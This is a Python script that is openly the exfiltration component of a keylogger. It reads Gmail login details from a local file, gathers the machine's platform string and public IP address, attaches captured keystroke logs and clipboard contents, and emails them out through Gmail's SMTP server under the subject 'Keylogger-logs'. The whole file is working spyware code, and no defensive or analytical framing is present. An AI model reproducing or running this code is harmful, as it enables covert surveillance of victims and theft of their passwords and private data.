import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import platform
import requests

lp = open("pass.txt", "r")
login = lp.readline()
password = lp.readline()
lp.close()

subject = '======Keylogger-logs======'

msg = MIMEMultipart()
msg['From'] = login
msg['To'] = login
msg['Subject'] = subject

system = platform.platform()
ip = requests.get('http://ip.42.pl/raw').text
msg.attach(MIMEText((system+'\n'+ip), 'plain'))

logs='logs.dat'
clipboard='clipboard.dat'
attachment=open(logs,'rb')
attachment2=open(clipboard, 'rb')

part = MIMEBase('application','octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition',"attachment; filename= "+logs)

part2 = MIMEBase('application','octet-stream')
part2.set_payload((attachment2).read())
encoders.encode_base64(part)
part2.add_header('Content-Disposition',"attachment; filename= "+clipboard)

msg.attach(part)
msg.attach(part2)
text = msg.as_string()
server = smtplib.SMTP('smtp.gmail.com',587)
server.starttls()
server.login(login,password)


server.sendmail(login,login ,text)
server.quit()